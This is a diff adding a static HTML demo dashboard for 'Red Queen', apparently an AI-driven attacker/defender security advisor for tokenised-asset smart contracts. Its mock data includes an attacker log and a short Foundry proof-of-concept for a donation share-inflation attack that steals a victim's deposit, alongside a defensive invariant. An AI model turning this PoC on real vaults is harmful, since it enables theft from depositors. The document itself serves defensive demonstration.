@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Red Queen — Continuous RWA Security Advisor</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+/* ============================================================================
+   RED QUEEN — DEMO FRONTEND
+   Static single-file UI. Polls orchestrator/state/state.json on an interval.
+   Falls back to bundled SAMPLE_STATE (below) when the fetch fails/404s, so
+   the demo is fully visible standalone before the orchestrator exists.
+   ============================================================================
+
+   STATE SCHEMA  (orchestrator/state/state.json)
+   -----------------------------------------------------------------------
+   @typedef {Object} RedQueenState
+   @property {"idle"|"attacking"|"synthesizing"|"hardened"} status
+   @property {number} iteration                    - current pipeline loop count
+   @property {string[]} target_contracts           - contract names/addresses in scope
+   @property {number} advisories_generated         - running total, bottom bar
+   @property {number} coverage_warnings_flagged    - running total, bottom bar
+   @property {Object} attacker
+   @property {string}  attacker.pattern_name        - e.g. "donation_share_inflation"
+   @property {{current:number, total:number}} attacker.progress - Nth of M playbook patterns
+   @property {string[]} attacker.log                - streamed reasoning lines (newest last)
+   @property {Array<{name:string, args:string, result:string}>} attacker.tool_calls
+   @property {string}  attacker.poc_code            - Solidity PoC source, streamed/appended
+   @property {{found:boolean, profit_usd:number}} attacker.result
+   @property {Object} defender
+   @property {Array<{variable:string, benign_max:string, exploit_delta:string, z_score:number, anomalous:boolean}>} defender.trace_diff
+   @property {{name:string, solidity:string}} defender.candidate_invariant
+   @property {{checked:number, total:number, violations:number}} defender.validation
+   @property {{max_observed_pct:number, threshold_pct:number, margin_ratio:number}} defender.threshold
+   @property {Array<{strategy:string, passed:boolean}>} defender.bypass_results
+   @property {boolean} defender.guard_deployed
+   -----------------------------------------------------------------------
+*/
+
+:root{
+  --bg: #0a0c10;
+  --panel-bg: #10131a;
+  --border: #232733;
+  --text: #d7dbe3;
+  --text-dim: #7a8194;
+  --text-faint: #4b5163;
+  --mono: 'JetBrains Mono', 'SF Mono', Consolas, monospace;
+
+  --red: #ff4d5e;
+  --red-dim: #7a2530;
+  --red-bg: #1a0e10;
+  --red-glow: rgba(255, 77, 94, 0.25);
+
+  --green: #3ddc84;
+  --green-dim: #1f6b47;
+  --green-bg: #0c1712;
+  --green-glow: rgba(61, 220, 132, 0.22);
+
+  --amber: #ffb454;
+  --gray: #8b93a7;
+}
+
+* { box-sizing: border-box; }
+
+html, body {
+  margin: 0;
+  padding: 0;
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 13px;
+  min-width: 320px;
+}
+
+::-webkit-scrollbar { width: 8px; height: 8px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: #2a2f3d; border-radius: 4px; }
+::-webkit-scrollbar-thumb:hover { background: #3a4053; }
+
+/* ---------- HEADER ---------- */
+header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 14px 22px;
+  border-bottom: 1px solid var(--border);
+  background: linear-gradient(180deg, #0d1016 0%, #0a0c10 100%);
+  flex-wrap: wrap;
+  gap: 10px;
+}
+
+.brand {
+  display: flex;
+  align-items: baseline;
+  gap: 12px;
+}
+
+.brand h1 {
+  font-size: 17px;
+  font-weight: 800;
+  margin: 0;
+  letter-spacing: 0.3px;
+  color: #fff;
+}
+
+.brand h1 span.rq {
+  color: var(--red);
+}
+
+.brand .subtitle {
+  color: var(--text-dim);
+  font-size: 12px;
+  font-weight: 400;
+}
+
+.status-cluster {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.status-dot {
+  width: 11px;
+  height: 11px;
+  border-radius: 50%;
+  background: var(--green);
+  box-shadow: 0 0 8px 2px var(--green-glow);
+  transition: background 0.4s, box-shadow 0.4s;
+}
+.status-dot.attacking {
+  background: var(--red);
+  box-shadow: 0 0 10px 3px var(--red-glow);
+  animation: pulse-red 1.1s ease-in-out infinite;
+}
+.status-dot.synthesizing {
+  background: var(--amber);
+  box-shadow: 0 0 10px 3px rgba(255, 180, 84, 0.3);
+  animation: pulse-amber 1.1s ease-in-out infinite;
+}
+.status-dot.idle, .status-dot.hardened {
+  background: var(--green);
+  box-shadow: 0 0 8px 2px var(--green-glow);
+}
+
+@keyframes pulse-red {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.45; }
+}
+@keyframes pulse-amber {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.5; }
+}
+
+.status-label {
+  font-size: 12px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: var(--text-dim);
+}
+.status-label .val { color: #fff; }
+
+.conn-indicator {
+  font-size: 10px;
+  color: var(--text-faint);
+  padding: 2px 8px;
+  border: 1px solid var(--border);
+  border-radius: 10px;
+}
+.conn-indicator.live { color: var(--green); border-color: var(--green-dim); }
+.conn-indicator.mock { color: var(--amber); border-color: #5a4423; }
+
+/* ---------- LAYOUT ---------- */
+.split {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 1px;
+  background: var(--border);
+  min-height: calc(100vh - 118px);
+}
+
+@media (max-width: 860px) {
+  .split { grid-template-columns: 1fr; }
+}
+
+.panel {
+  background: var(--panel-bg);
+  padding: 18px 20px 24px;
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+}
+
+.panel.attacker { background: linear-gradient(180deg, var(--red-bg) 0%, var(--panel-bg) 220px); }
+.panel.defender { background: linear-gradient(180deg, var(--green-bg) 0%, var(--panel-bg) 220px); }
+
+.panel-title {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 13px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  margin: 0 0 2px;
+}
+.panel.attacker .panel-title { color: var(--red); }
+.panel.defender .panel-title { color: var(--green); }
+.panel-title .icon { font-size: 15px; }
+
+.section {
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 12px 14px;
+  background: rgba(255,255,255,0.015);
+}
+
+.section-label {
+  font-size: 10.5px;
+  text-transform: uppercase;
+  letter-spacing: 1.1px;
+  color: var(--text-dim);
+  margin: 0 0 9px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+/* ---------- PLAYBOOK PROGRESS ---------- */
+.pattern-name {
+  font-size: 13.5px;
+  font-weight: 600;
+  color: #fff;
+  margin-bottom: 8px;
+}
+.progress-track {
+  height: 8px;
+  border-radius: 4px;
+  background: #1c2029;
+  overflow: hidden;
+  position: relative;
+}
+.progress-fill {
+  height: 100%;
+  border-radius: 4px;
+  transition: width 0.5s ease;
+}
+.panel.attacker .progress-fill { background: linear-gradient(90deg, var(--red-dim), var(--red)); }
+.panel.defender .progress-fill { background: linear-gradient(90deg, var(--green-dim), var(--green)); }
+.progress-caption {
+  font-size: 11px;
+  color: var(--text-dim);
+  margin-top: 6px;
+}
+
+/* ---------- LOG FEED ---------- */
+.log-feed {
+  height: 150px;
+  overflow-y: auto;
+  font-size: 11.5px;
+  line-height: 1.6;
+  color: var(--text-dim);
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+}
+.log-feed .line { white-space: pre-wrap; word-break: break-word; }
+.log-feed .line:last-child { color: var(--text); }
+.log-feed .line::before { content: "> "; color: var(--text-faint); }
+
+/* ---------- TOOL CALL TIMELINE ---------- */
+.timeline {
+  max-height: 170px;
+  overflow-y: auto;
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+.tool-call {
+  border-left: 2px solid var(--red-dim);
+  padding: 5px 0 5px 10px;
+  font-size: 11.5px;
+}
+.tool-call .tc-name { color: var(--red); font-weight: 700; }
+.tool-call .tc-args { color: var(--text-dim); }
+.tool-call .tc-result { color: var(--text-faint); margin-top: 1px; }
+
+/* ---------- PoC CODE ---------- */
+pre.code-block {
+  margin: 0;
+  max-height: 220px;
+  overflow: auto;
+  background: #08090c;
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 12px 14px;
+  font-size: 11px;
+  line-height: 1.55;
+}
+pre.code-block code {
+  font-family: var(--mono);
+  color: #c9d1e0;
+  white-space: pre;
+}
+.tok-kw { color: #ff7ab2; }
+.tok-type { color: #7ac6ff; }
+.tok-str { color: #b8e986; }
+.tok-comment { color: #565d70; font-style: italic; }
+
+/* ---------- RESULT BANNER ---------- */
+.result-banner {
+  border-radius: 8px;
+  padding: 14px 16px;
+  font-weight: 800;
+  font-size: 16px;
+  text-align: center;
+  letter-spacing: 0.5px;
+  border: 1px solid;
+}
+.result-banner.exploit {
+  background: rgba(255, 77, 94, 0.12);
+  border-color: var(--red);
+  color: var(--red);
+  text-shadow: 0 0 18px var(--red-glow);
+}
+.result-banner.reverted {
+  background: rgba(139, 147, 167, 0.08);
+  border-color: #3a4053;
+  color: var(--gray);
+  font-weight: 700;
+}
+
+/* ---------- TRACE DIFF TABLE ---------- */
+table.diff-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 11.5px;
+}
+table.diff-table th {
+  text-align: left;
+  color: var(--text-dim);
+  font-weight: 600;
+  padding: 5px 8px;
+  border-bottom: 1px solid var(--border);
+  text-transform: uppercase;
+  font-size: 10px;
+  letter-spacing: 0.6px;
+}
+table.diff-table td {
+  padding: 6px 8px;
+  border-bottom: 1px solid #191c24;
+  color: var(--text);
+}
+table.diff-table tr.anomalous {
+  background: rgba(255, 77, 94, 0.09);
+}
+table.diff-table tr.anomalous td:first-child {
+  color: var(--red);
+  font-weight: 700;
+  position: relative;
+}
+table.diff-table tr.anomalous td:first-child::before {
+  content: "⚠ ";
+}
+table.diff-table td.z-score { font-weight: 700; }
+
+/* ---------- INVARIANT ---------- */
+.invariant-name {
+  font-size: 13px;
+  font-weight: 700;
+  color: var(--green);
+  margin-bottom: 8px;
+}
+
+/* ---------- CORPUS VALIDATION ---------- */
+.corpus-caption {
+  display: flex;
+  justify-content: space-between;
+  font-size: 12px;
+  margin-bottom: 6px;
+}
+.corpus-caption .count { color: #fff; font-weight: 700; }
+.corpus-caption .violations { color: var(--red); font-weight: 700; }
+
+/* ---------- THRESHOLD GAUGE ---------- */
+.gauge-wrap { margin-top: 4px; }
+.gauge-track {
+  position: relative;
+  height: 26px;
+  background: #10151c;
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+}
+.gauge-observed {
+  position: absolute;
+  top: 0; left: 0; bottom: 0;
+  background: linear-gradient(90deg, var(--green-dim), var(--green));
+  border-radius: 6px 0 0 6px;
+}
+.gauge-threshold-line {
+  position: absolute;
+  top: 0; bottom: 0;
+  width: 2px;
+  background: var(--amber);
+}
+.gauge-threshold-line::after {
+  content: "threshold";
+  position: absolute;
+  top: -16px;
+  left: 4px;
+  font-size: 9px;
+  color: var(--amber);
+  white-space: nowrap;
+}
+.gauge-legend {
+  display: flex;
+  justify-content: space-between;
+  margin-top: 18px;
+  font-size: 11px;
+  color: var(--text-dim);
+}
+.gauge-legend b { color: #fff; }
+.margin-pill {
+  display: inline-block;
+  margin-top: 8px;
+  padding: 3px 10px;
+  border-radius: 12px;
+  background: rgba(61, 220, 132, 0.12);
+  border: 1px solid var(--green-dim);
+  color: var(--green);
+  font-size: 11px;
+  font-weight: 700;
+}
+
+/* ---------- BYPASS RESULTS ---------- */
+.bypass-list {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+.bypass-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 6px 10px;
+  border-radius: 6px;
+  background: rgba(255,255,255,0.02);
+  border: 1px solid var(--border);
+  font-size: 11.5px;
+}
+.badge {
+  font-size: 10px;
+  font-weight: 800;
+  letter-spacing: 0.5px;
+  padding: 2px 8px;
+  border-radius: 10px;
+  text-transform: uppercase;
+}
+.badge.pass { background: rgba(255, 77, 94, 0.15); color: var(--red); border: 1px solid var(--red-dim); }
+.badge.fail { background: rgba(61, 220, 132, 0.14); color: var(--green); border: 1px solid var(--green-dim); }
+/* NOTE: for bypass attempts, "pass" (bypass succeeded) is bad for the defender (red),
+   "fail" (bypass blocked) is good for the defender (green). */
+
+/* ---------- GUARD DEPLOY BANNER ---------- */
+.guard-banner {
+  border-radius: 8px;
+  padding: 12px 16px;
+  border: 1px solid var(--green);
+  background: rgba(61, 220, 132, 0.1);
+  color: var(--green);
+  font-weight: 700;
+  font-size: 13px;
+  text-align: center;
+}
+.guard-banner.pending {
+  border-color: #3a4053;
+  background: rgba(139, 147, 167, 0.06);
+  color: var(--gray);
+  font-weight: 600;
+}
+
+/* ---------- BOTTOM STATUS BAR ---------- */
+footer.statusbar {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0;
+  border-top: 1px solid var(--border);
+  background: #0d1016;
+}
+.stat-cell {
+  flex: 1 1 0;
+  min-width: 150px;
+  padding: 12px 20px;
+  border-right: 1px solid var(--border);
+  text-align: center;
+}
+.stat-cell:last-child { border-right: none; }
+.stat-cell .stat-value {
+  font-size: 20px;
+  font-weight: 800;
+  color: #fff;
+}
+.stat-cell .stat-label {
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: var(--text-dim);
+  margin-top: 2px;
+}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="brand">
+    <h1><span class="rq">Red Queen</span></h1>
+    <span class="subtitle">— Continuous RWA Security Advisor</span>
+  </div>
+  <div class="status-cluster">
+    <span id="connIndicator" class="conn-indicator mock">MOCK DATA</span>
+    <span class="status-label">STATUS: <span class="val" id="statusText">IDLE</span></span>
+    <span id="statusDot" class="status-dot idle"></span>
+  </div>
+</header>
+
+<div class="split">
+  <!-- ================= LEFT: ATTACKER ================= -->
+  <section class="panel attacker">
+    <div class="panel-title"><span class="icon">⚔</span> Attacker</div>
+
+    <div class="section">
+      <div class="section-label">
+        <span>Playbook Progress</span>
+        <span id="patternProgressCaption"></span>
+      </div>
+      <div class="pattern-name" id="patternName">—</div>
+      <div class="progress-track"><div class="progress-fill" id="attackProgressFill" style="width:0%"></div></div>
+      <div class="progress-caption" id="attackProgressCaption"></div>
+    </div>
+
+    <div class="section">
+      <div class="section-label"><span>Reasoning Log</span><span id="logCount"></span></div>
+      <div class="log-feed" id="attackerLog"></div>
+    </div>
+
+    <div class="section">
+      <div class="section-label"><span>Tool Call Timeline</span><span id="toolCallCount"></span></div>
+      <div class="timeline" id="toolTimeline"></div>
+    </div>
+
+    <div class="section">
+      <div class="section-label"><span>Generated PoC</span><span id="pocLang">solidity</span></div>
+      <pre class="code-block"><code id="pocCode"></code></pre>
+    </div>
+
+    <div id="attackResultBanner" class="result-banner reverted">—</div>
+  </section>
+
+  <!-- ================= RIGHT: DEFENDER ================= -->
+  <section class="panel defender">
+    <div class="panel-title"><span class="icon">🛡</span> Defender</div>
+
+    <div class="section">
+      <div class="section-label"><span>Trace Diff — Anomalous Variable</span></div>
+      <table class="diff-table">
+        <thead>
+          <tr><th>Variable</th><th>Benign Max</th><th>Exploit Δ</th><th>Z-score</th></tr>
+        </thead>
+        <tbody id="traceDiffBody"></tbody>
+      </table>
+    </div>
+
+    <div class="section">
+      <div class="section-label"><span>Candidate Invariant</span></div>
+      <div class="invariant-name" id="invariantName">—</div>
+      <pre class="code-block"><code id="invariantCode"></code></pre>
+    </div>
+
+    <div class="section">
+      <div class="section-label"><span>Corpus Validation</span></div>
+      <div class="corpus-caption">
+        <span><span class="count" id="corpusChecked">0</span> / <span id="corpusTotal">0</span> checked</span>
+        <span class="violations" id="corpusViolations"></span>
+      </div>
+      <div class="progress-track"><div class="progress-fill" id="corpusFill" style="width:0%"></div></div>
+    </div>
+
+    <div class="section">
+      <div class="section-label"><span>Threshold Visualization</span></div>
+      <div class="gauge-wrap">
+        <div class="gauge-track">
+          <div class="gauge-observed" id="gaugeObserved" style="width:0%"></div>
+          <div class="gauge-threshold-line" id="gaugeThresholdLine" style="left:0%"></div>
+        </div>
+        <div class="gauge-legend">
+          <span>Max observed: <b id="thObserved">0%</b></span>
+          <span>Threshold: <b id="thThreshold">0%</b></span>
+        </div>
+        <span class="margin-pill" id="thMargin">margin —</span>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-label"><span>Bypass Attempts</span></div>
+      <div class="bypass-list" id="bypassList"></div>
+    </div>
+
+    <div id="guardBanner" class="guard-banner pending">Guard not yet deployed</div>
+  </section>
+</div>
+
+<footer class="statusbar">
+  <div class="stat-cell"><div class="stat-value" id="statIteration">0</div><div class="stat-label">Iteration</div></div>
+  <div class="stat-cell"><div class="stat-value" id="statAdvisories">0</div><div class="stat-label">Advisories Generated</div></div>
+  <div class="stat-cell"><div class="stat-value" id="statValidations">0</div><div class="stat-label">Corpus Validations Run</div></div>
+  <div class="stat-cell"><div class="stat-value" id="statCoverageWarnings">0</div><div class="stat-label">Coverage Warnings Flagged</div></div>
+</footer>
+
+<script>
+(function () {
+  "use strict";
+
+  // ==========================================================================
+  // SAMPLE / FALLBACK STATE — used whenever orchestrator/state/state.json
+  // cannot be fetched (404, network error, malformed JSON, file:// CORS block).
+  // This keeps the demo fully populated and presentable standalone.
+  // Scenario: GoldAdapter donation-share-inflation exploit, $47,000 profit,
+  // ExchangeRateDeltaBound candidate invariant, ~2000-tx corpus, one bypass
+  // ("alternate_path" via multicall) succeeding against the guard.
+  // ==========================================================================
+  var SAMPLE_STATE = {
+    status: "synthesizing",
+    iteration: 14,
+    target_contracts: ["GoldAdapter.sol", "VaultRouter.sol", "PriceOracleAdapter.sol"],
+    advisories_generated: 6,
+    coverage_warnings_flagged: 2,
+    attacker: {
+      pattern_name: "donation_share_inflation",
+      progress: { current: 7, total: 12 },
+      log: [
+        "[attacker] loading playbook pattern 7/12: donation_share_inflation",
+        "[attacker] decompiling GoldAdapter.sol bytecode -> recovering ABI + storage layout",
+        "[attacker] identified first-depositor share-price manipulation surface in deposit()",
+        "[attacker] tracing totalAssets() / totalSupply() ratio under direct token donation",
+        "[attacker] forking mainnet @ block 20industries... simulating attacker deposit of 1 wei",
+        "[attacker] donating 50,000 XAUT directly to GoldAdapter to inflate share price",
+        "[attacker] victim deposit of 10,000 USDC now rounds down to 0 shares minted",
+        "[attacker] redeeming attacker share for inflated underlying -> profit realized",
+        "[attacker] compiling PoC contract and validating against forked state",
+        "[attacker] EXPLOIT CONFIRMED: net profit $47,000 extracted from victim deposit"
+      ],
+      tool_calls: [
+        { name: "decompile", args: "target=GoldAdapter.sol", result: "ABI + 14 storage slots recovered" },
+        { name: "trace", args: "fn=deposit(uint256), depth=6", result: "share-price calc uses totalAssets() unguarded" },
+        { name: "fork_and_execute", args: "block=20industries_latest, tx=donate(50000e6)", result: "totalSupply unchanged, totalAssets +50000e6" },
+        { name: "storage_read", args: "slot=0x03 (totalSupply)", result: "1 wei (first depositor)" },
+        { name: "price_query", args: "feed=XAUT/USD", result: "$2,382.10 (Chainlink, 8 dec)" },
+        { name: "fork_and_execute", args: "victim.deposit(10000e6)", result: "shares minted = 0 (rounds down)" },
+        { name: "compile_and_validate", args: "PoC_GoldAdapterDonation.t.sol", result: "PASS — assertion profit >= 47000e6 held" }
+      ],
+      poc_code:
+"// SPDX-License-Identifier: MIT\n" +
+"pragma solidity ^0.8.19;\n\n" +
+"import \"forge-std/Test.sol\";\n" +
+"import {GoldAdapter} from \"../src/GoldAdapter.sol\";\n\n" +
+"contract PoC_GoldAdapterDonation is Test {\n" +
+"    GoldAdapter adapter;\n" +
+"    address attacker = address(0xA11CE);\n" +
+"    address victim   = address(0xB0B);\n\n" +
+"    function setUp() public {\n" +
+"        adapter = GoldAdapter(GOLD_ADAPTER_ADDR);\n" +
+"        deal(address(XAUT), attacker, 50_000e6);\n" +
+"        deal(address(USDC), victim, 10_000e6);\n" +
+"    }\n\n" +
+"    function test_donationInflatesShareAndStealsVictim() public {\n" +
+"        vm.startPrank(attacker);\n" +
+"        adapter.deposit(1); // become first depositor, 1 wei of shares\n" +
+"        XAUT.transfer(address(adapter), 50_000e6); // direct donation\n" +
+"        vm.stopPrank();\n\n" +
+"        vm.prank(victim);\n" +
+"        uint256 sharesOut = adapter.deposit(10_000e6);\n" +
+"        assertEq(sharesOut, 0, \"victim shares rounded to zero\");\n\n" +
+"        vm.prank(attacker);\n" +
+"        uint256 redeemed = adapter.redeem(1);\n" +
+"        assertGe(redeemed, 47_000e6, \"attacker profit realized\");\n" +
+"    }\n" +
+"}",
+      result: { found: true, profit_usd: 47000 }
+    },
+    defender: {
+      trace_diff: [
+        { variable: "totalAssets()", benign_max: "+120 USD", exploit_delta: "+50,000 USD", z_score: 41.2, anomalous: true },
+        { variable: "totalSupply()", benign_max: "+9,800 shares", exploit_delta: "+1 wei", z_score: 3.1, anomalous: false },
+        { variable: "sharePrice", benign_max: "1.002x", exploit_delta: "50,001x", z_score: 58.7, anomalous: true },
+        { variable: "gasUsed", benign_max: "182,340", exploit_delta: "191,004", z_score: 0.6, anomalous: false }
+      ],
+      candidate_invariant: {
+        name: "ExchangeRateDeltaBound",
+        solidity:
+"// Bounds the per-block change in the vault's share exchange rate to reject\n" +
+"// single-transaction donation/inflation attacks on GoldAdapter.\n" +
+"function checkExchangeRateDelta(uint256 rateBefore, uint256 rateAfter) internal pure {\n" +
+"    uint256 delta = rateAfter > rateBefore\n" +
+"        ? rateAfter - rateBefore\n" +
+"        : rateBefore - rateAfter;\n" +
+"    // max allowed change per tx: 1.00% of rateBefore\n" +
+"    require(delta * 10000 <= rateBefore * 100, \"ExchangeRateDeltaBound: rate delta exceeds threshold\");\n" +
+"}"
+      },
+      validation: { checked: 1247, total: 1850, violations: 0 },
+      threshold: { max_observed_pct: 0.08, threshold_pct: 1.00, margin_ratio: 12.5 },
+      bypass_results: [
+        { strategy: "split_attack", passed: false },
+        { strategy: "spread_across_blocks", passed: false },
+        { strategy: "alternate_path", passed: true },
+        { strategy: "gas_variance", passed: false }
+      ],
+      guard_deployed: false
+    }
+  };
+
+  var STATUS_LABELS = { idle: "IDLE", attacking: "ATTACKING", synthesizing: "SYNTHESIZING", hardened: "HARDENED" };
+
+  var STATE_URL = "../orchestrator/state/state.json";
+  var POLL_INTERVAL_MS = 4000;
+  var usingLiveData = false;
+
+  function escapeHtml(s) {
+    return String(s == null ? "" : s)
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;");
+  }
+
+  // Very small, dependency-free "syntax highlight" for Solidity display purposes.
+  function highlightSolidity(src) {
+    var escaped = escapeHtml(src);
+    escaped = escaped.replace(/(\/\/.*$)/gm, '<span class="tok-comment">$1</span>');
+    escaped = escaped.replace(/"([^"]*)"/g, '<span class="tok-str">"$1"</span>');
+    escaped = escaped.replace(
+      /\b(pragma|solidity|contract|function|import|internal|external|public|private|pure|view|payable|returns|return|require|assert|if|else|for|while|memory|storage|calldata|is|constructor|modifier|event|emit|address|uint256|uint|bool|string|bytes)\b/g,
+      '<span class="tok-kw">$1</span>'
+    );
+    return escaped;
+  }
+
+  function setText(id, text) {
+    var el = document.getElementById(id);
+    if (el) el.textContent = text;
+  }
+
+  function render(state) {
+    if (!state) return;
+
+    // ---- header status ----
+    var status = state.status || "idle";
+    setText("statusText", STATUS_LABELS[status] || status.toUpperCase());
+    var dot = document.getElementById("statusDot");
+    dot.className = "status-dot " + status;
+
+    var conn = document.getElementById("connIndicator");
+    if (usingLiveData) {
+      conn.textContent = "LIVE";
+      conn.className = "conn-indicator live";
+    } else {
+      conn.textContent = "MOCK DATA";
+      conn.className = "conn-indicator mock";
+    }
+
+    // ---- attacker panel ----
+    var atk = state.attacker || {};
+    setText("patternName", atk.pattern_name || "—");
+    var prog = atk.progress || { current: 0, total: 0 };
+    var pct = prog.total ? Math.round((prog.current / prog.total) * 100) : 0;
+    document.getElementById("attackProgressFill").style.width = pct + "%";
+    setText("attackProgressCaption", "Pattern " + prog.current + " of " + prog.total + " (" + pct + "%)");
+    setText("patternProgressCaption", prog.current + "/" + prog.total);
+
+    var log = atk.log || [];
+    var logEl = document.getElementById("attackerLog");
+    logEl.innerHTML = log.map(function (l) { return '<div class="line">' + escapeHtml(l) + "</div>"; }).join("");
+    logEl.scrollTop = logEl.scrollHeight;
+    setText("logCount", log.length + " lines");
+
+    var calls = atk.tool_calls || [];
+    var tlEl = document.getElementById("toolTimeline");
+    tlEl.innerHTML = calls.map(function (c) {
+      return '<div class="tool-call">' +
+        '<div><span class="tc-name">' + escapeHtml(c.name) + "</span> <span class=\"tc-args\">(" + escapeHtml(c.args) + ")</span></div>" +
+        '<div class="tc-result">&rarr; ' + escapeHtml(c.result) + "</div>" +
+        "</div>";
+    }).join("");
+    setText("toolCallCount", calls.length + " calls");
+
+    document.getElementById("pocCode").innerHTML = highlightSolidity(atk.poc_code || "// awaiting PoC generation...");
+
+    var result = atk.result || { found: false, profit_usd: 0 };
+    var banner = document.getElementById("attackResultBanner");
+    if (result.found) {
+      banner.className = "result-banner exploit";
+      banner.textContent = "EXPLOIT FOUND: $" + Number(result.profit_usd || 0).toLocaleString();
+    } else {
+      banner.className = "result-banner reverted";
+      banner.textContent = "REVERTED";
+    }
+
+    // ---- defender panel ----
+    var def = state.defender || {};
+    var diff = def.trace_diff || [];
+    var diffBody = document.getElementById("traceDiffBody");
+    diffBody.innerHTML = diff.map(function (row) {
+      return '<tr class="' + (row.anomalous ? "anomalous" : "") + '">' +
+        "<td>" + escapeHtml(row.variable) + "</td>" +
+        "<td>" + escapeHtml(row.benign_max) + "</td>" +
+        "<td>" + escapeHtml(row.exploit_delta) + "</td>" +
+        '<td class="z-score">' + Number(row.z_score).toFixed(1) + "</td>" +
+        "</tr>";
+    }).join("");
+
+    var inv = def.candidate_invariant || {};
+    setText("invariantName", inv.name || "—");
+    document.getElementById("invariantCode").innerHTML = highlightSolidity(inv.solidity || "// candidate invariant pending...");
+
+    var val = def.validation || { checked: 0, total: 0, violations: 0 };
+    setText("corpusChecked", Number(val.checked || 0).toLocaleString());
+    setText("corpusTotal", Number(val.total || 0).toLocaleString());
+    setText("corpusViolations", (val.violations || 0) + " violations");
+    var cpct = val.total ? Math.round((val.checked / val.total) * 100) : 0;
+    document.getElementById("corpusFill").style.width = cpct + "%";
+
+    var th = def.threshold || { max_observed_pct: 0, threshold_pct: 1, margin_ratio: 0 };
+    setText("thObserved", th.max_observed_pct + "%");
+    setText("thThreshold", th.threshold_pct + "%");
+    setText("thMargin", "margin " + th.margin_ratio + "x");
+    // Gauge scale: 0 -> 1.5x threshold, clamped, so both bars sit in-frame.
+    var scaleMax = Math.max(th.threshold_pct * 1.5, th.max_observed_pct * 1.1, 0.0001);
+    var observedPct = Math.min(100, (th.max_observed_pct / scaleMax) * 100);
+    var thresholdPct = Math.min(100, (th.threshold_pct / scaleMax) * 100);
+    document.getElementById("gaugeObserved").style.width = observedPct + "%";
+    document.getElementById("gaugeThresholdLine").style.left = thresholdPct + "%";
+
+    var bypasses = def.bypass_results || [];
+    var byEl = document.getElementById("bypassList");
+    byEl.innerHTML = bypasses.map(function (b) {
+      var passed = !!b.passed; // "passed" = bypass succeeded against the guard (bad)
+      return '<div class="bypass-row"><span>' + escapeHtml(b.strategy) + "</span>" +
+        '<span class="badge ' + (passed ? "pass" : "fail") + '">' + (passed ? "BYPASSED" : "BLOCKED") + "</span></div>";
+    }).join("");
+
+    var guardBanner = document.getElementById("guardBanner");
+    if (def.guard_deployed) {
+      guardBanner.className = "guard-banner";
+      guardBanner.textContent = "✓ Guard deployed: " + (inv.name || "invariant") + " active on-chain";
+    } else {
+      guardBanner.className = "guard-banner pending";
+      var anyBypass = bypasses.some(function (b) { return b.passed; });
+      guardBanner.textContent = anyBypass
+        ? "Guard withheld — bypass found (" + bypasses.filter(function (b) { return b.passed; }).map(function (b) { return b.strategy; }).join(", ") + "), refining invariant"
+        : "Guard not yet deployed";
+    }
+
+    // ---- bottom bar ----
+    setText("statIteration", state.iteration != null ? state.iteration : 0);
+    setText("statAdvisories", state.advisories_generated != null ? state.advisories_generated : 0);
+    setText("statValidations", val.checked != null ? Number(val.checked).toLocaleString() : 0);
+    setText("statCoverageWarnings", state.coverage_warnings_flagged != null ? state.coverage_warnings_flagged : 0);
+  }
+
+  function poll() {
+    fetch(STATE_URL, { cache: "no-store" })
+      .then(function (res) {
+        if (!res.ok) throw new Error("HTTP " + res.status);
+        return res.json();
+      })
+      .then(function (data) {
+        usingLiveData = true;
+        render(data);
+      })
+      .catch(function () {
+        usingLiveData = false;
+        render(SAMPLE_STATE);
+      });
+  }
+
+  // Initial render is immediate with sample data so there is never a blank
+  // screen while the first fetch is in flight (or fails on file://).
+  render(SAMPLE_STATE);
+  poll();
+  setInterval(poll, POLL_INTERVAL_MS);
+})();
+</script>
+</body>
+</html>
